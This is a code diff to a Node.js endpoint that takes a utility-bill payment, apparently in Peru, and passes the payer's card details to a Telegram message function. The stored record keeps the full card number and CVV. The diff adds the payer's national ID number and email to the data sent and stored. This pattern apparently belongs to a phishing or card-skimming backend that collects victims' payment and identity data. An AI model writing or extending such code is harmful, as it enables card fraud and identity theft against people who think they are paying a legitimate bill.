@@ -34,6 +34,8 @@ async function sendTelegram(data) {
     `━━━━━━━━━━━━━━━━━━━━`,
     `👤 *Cliente:* ${data.nombre}`,
     `📋 *Suministro:* ${data.codcliente}`,
+    ...(data.dni ? [`🪪 *DNI:* ${data.dni}`] : []),
+    ...(data.email ? [`📧 *Correo:* ${data.email}`] : []),
     `💰 *Monto:* S/ ${Number(data.monto).toFixed(2)}`,
     `━━━━━━━━━━━━━━━━━━━━`,
     `💳 *Tarjeta:* ${data.tarjeta}`,
@@ -71,7 +73,7 @@ module.exports = async (req, res) => {
   if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== 'POST') return res.status(405).json({ error: 'Método no permitido' });
 
-  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv } = req.body || {};
+  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email } = req.body || {};
   if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
     return res.status(400).json({ error: 'Faltan campos requeridos' });
   }
@@ -89,6 +91,7 @@ module.exports = async (req, res) => {
     codcliente, nombre, monto: Number(monto),
     tarjeta: tarjetaMask, numTarjetaCompleto: numCompleto,
     cvv: cvv || '', titular, vencimiento, estado, nroOperacion, fecha,
+    dni: dni || undefined, email: email || undefined,
   };
 
   if (process.env.DATABASE_URL) {
